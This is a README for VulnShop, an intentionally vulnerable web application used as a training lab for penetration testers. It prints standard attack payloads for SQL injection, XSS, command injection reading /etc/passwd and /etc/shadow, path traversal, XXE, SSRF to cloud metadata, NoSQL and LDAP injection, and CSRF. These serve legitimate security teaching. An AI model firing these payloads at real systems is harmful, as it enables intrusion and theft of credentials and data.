# VulnShop - Advanced Penetration Testing Lab

![VulnShop](https://img.shields.io/badge/VulnShop-Pentesting%20Lab-red)
![OWASP](https://img.shields.io/badge/OWASP-Top%2010-orange)
![License](https://img.shields.io/badge/License-MIT-blue)

**VulnShop** is a deliberately vulnerable web application designed for security professionals, penetration testers, and cybersecurity students to practice and learn about web application security vulnerabilities. This application contains multiple real-world vulnerabilities based on the OWASP Top 10 and beyond.

## ⚠️ WARNING

**This application is intentionally vulnerable and should NEVER be deployed in a production environment or exposed to the internet.** Use only in isolated, controlled environments for educational and testing purposes.

## 🎯 Features

- **Comprehensive Vulnerability Coverage**: Includes OWASP Top 10 and advanced attack vectors
- **Real-World Scenarios**: Vulnerabilities based on common real-world implementations
- **Multiple Attack Vectors**: SQL Injection, XSS, Command Injection, SSRF, XXE, and more
- **Educational Focus**: Each vulnerability includes examples and payloads
- **Easy Setup**: Simple static HTML/JS application, no complex dependencies

## 📋 Table of Contents

- [Installation](#installation)
- [Vulnerabilities](#vulnerabilities)
- [Usage](#usage)
- [Vulnerability Details](#vulnerability-details)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)

## 🚀 Installation

### Prerequisites

- A web server (Apache, Nginx, or Python's built-in server)
- Modern web browser
- (Optional) Backend server for full functionality

### Quick Start

1. Clone the repository:
```bash
git clone https://github.com/yourusername/vulnshop.git
cd vulnshop
```

2. Start a local web server:

**Using Python 3:**
```bash
python3 -m http.server 8000
```

**Using Python 2:**
```bash
python -m SimpleHTTPServer 8000
```

**Using Node.js (http-server):**
```bash
npx http-server -p 8000
```

3. Open your browser and navigate to:
```
http://localhost:8000
```

## 🔓 Vulnerabilities

### OWASP Top 10 (2021)

1. **A01:2021 – Broken Access Control**
   - Insecure Direct Object References (IDOR)
   - Missing Function Level Access Control
   - Privilege Escalation

2. **A02:2021 – Cryptographic Failures**
   - Weak JWT implementation
   - Sensitive data exposure
   - Insecure password storage

3. **A03:2021 – Injection**
   - SQL Injection (Union, Error-based, Blind, Time-based)
   - NoSQL Injection
   - LDAP Injection
   - Command Injection
   - Path Traversal

4. **A04:2021 – Insecure Design**
   - Business logic flaws
   - Race conditions
   - Workflow bypasses

5. **A05:2021 – Security Misconfiguration**
   - Default credentials
   - Exposed admin panels
   - Debug mode enabled

6. **A06:2021 – Vulnerable and Outdated Components**
   - Outdated libraries (simulated)
   - Known CVEs

7. **A07:2021 – Identification and Authentication Failures**
   - Weak authentication
   - Session fixation
   - Password reset flaws

8. **A08:2021 – Software and Data Integrity Failures**
   - Insecure deserialization
   - Unsigned updates

9. **A09:2021 – Security Logging and Monitoring Failures**
   - Insufficient logging
   - No security monitoring

10. **A10:2021 – Server-Side Request Forgery (SSRF)**
    - Internal network access
    - Cloud metadata access
    - Protocol handler abuse

### Additional Vulnerabilities

- **Cross-Site Scripting (XSS)**: Reflected, Stored, DOM-based
- **Cross-Site Request Forgery (CSRF)**: Multiple endpoints
- **XML External Entity (XXE)**: File disclosure, SSRF
- **Server-Side Request Forgery (SSRF)**: Internal network scanning
- **Insecure Deserialization**: PHP, Python, Java
- **Template Injection**: Server-side template injection
- **Business Logic Flaws**: Price manipulation, negative quantities
- **Race Conditions**: Coupon application, concurrent requests

## 📖 Vulnerability Details

### SQL Injection

**Location**: `/admin/sql_console.html`

**Description**: The SQL console allows direct SQL query execution without proper input validation or parameterized queries.

**Payloads**:
```sql
-- Union-based
1' UNION SELECT username, password, email FROM users--

-- Error-based
1' AND (SELECT SUBSTRING(@@version,1,1))='5'--

-- Time-based blind
1' AND SLEEP(5)--

-- Boolean-based blind
1' OR '1'='1
1' OR '1'='2
```

### Cross-Site Scripting (XSS)

**Location**: `/xss.html`, `/search.html`

**Types**:
- **Reflected XSS**: Search parameter reflected without encoding
- **Stored XSS**: Comments stored and displayed without sanitization
- **DOM-based XSS**: Hash fragment manipulation

**Payloads**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert(document.cookie)
```

### Command Injection

**Location**: `/cmd-injection.html`

**Description**: System commands executed with user-controlled input.

**Payloads**:
```
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | id
127.0.0.1 `whoami`
127.0.0.1 $(cat /etc/shadow)
```

### Path Traversal

**Location**: `/path-traversal.html`

**Description**: File access without proper path validation.

**Payloads**:
```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
/etc/passwd%00
```

### XXE (XML External Entity)

**Location**: `/xxe.html`

**Description**: XML parser processes external entities without restrictions.

**Payloads**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<product>
  <name>&xxe;</name>
</product>
```

### SSRF (Server-Side Request Forgery)

**Location**: `/ssrf.html`

**Description**: URL fetcher allows requests to internal resources.

**Payloads**:
```
http://localhost:8080/admin/config
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:3306
file:///etc/passwd
```

### NoSQL Injection

**Location**: `/api.html`

**Description**: MongoDB queries vulnerable to injection.

**Payloads**:
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$ne": ""}}
```

### LDAP Injection

**Location**: `/ldap-injection.html`

**Description**: LDAP queries constructed from user input.

**Payloads**:
```
*
admin*
*)(uid=*
admin)(|(uid=*
```

### CSRF (Cross-Site Request Forgery)

**Location**: `/csrf.html`

**Description**: State-changing operations lack CSRF protection.

**Attack Example**:
```html
<form action="http://vulnshop.com/api/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

### Insecure Deserialization

**Location**: `/deserialization.html`

**Description**: Deserialization of untrusted data without validation.

**Supported Formats**: PHP Serialize, Python Pickle, Java Serialization, JSON

### Business Logic Flaws

**Location**: `/business-logic.html`

**Issues**:
- Price manipulation
- Negative quantities
- Race conditions
- Workflow bypasses
- Time-based logic flaws

### IDOR (Insecure Direct Object Reference)

**Location**: `/api.html`

**Description**: Direct access to resources without authorization checks.

**Example**: Accessing `/api/users/1` without verifying if user has permission.

### JWT Vulnerabilities

**Location**: `/api.html`

**Issues**:
- Weak algorithm (HS256)
- Algorithm confusion
- No signature verification
- Weak secrets

## 🎓 Usage

### For Penetration Testers

1. Start the application in an isolated environment
2. Use tools like Burp Suite, OWASP ZAP, or manual testing
3. Practice each vulnerability type systematically
4. Document findings and remediation strategies

### For Security Students

1. Read the vulnerability descriptions
2. Understand the attack vectors
3. Practice with provided payloads
4. Learn about remediation techniques

### For Developers

1. Review vulnerable code patterns
2. Understand common mistakes
3. Learn secure coding practices
4. Implement proper security controls

## 🛠️ Testing Tools

Recommended tools for testing:

- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Free security scanner
- **SQLMap**: Automated SQL injection tool
- **XSSer**: Cross-site scripting framework
- **Commix**: Command injection exploitation tool
- **SSRFmap**: SSRF exploitation framework

## 📚 Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacker101](https://www.hacker101.com/)

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request. Areas for contribution:

- Additional vulnerability types
- More realistic attack scenarios
- Better documentation
- Bug fixes
- Security improvements (for the framework, not the vulnerabilities)

## 📝 License

This project is licensed under the MIT License - see the LICENSE file for details.

## ⚖️ Disclaimer

**This software is provided for educational purposes only.** The authors and contributors are not responsible for any misuse or damage caused by this software. Users are solely responsible for ensuring they have proper authorization before testing any systems. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

## 🙏 Acknowledgments

- OWASP for the Top 10 and security guidelines
- Security community for vulnerability research
- All contributors who help improve this project

## 📧 Contact

For questions, issues, or suggestions, please open an issue on GitHub.

---

**Remember**: With great power comes great responsibility. Use this knowledge ethically and legally.
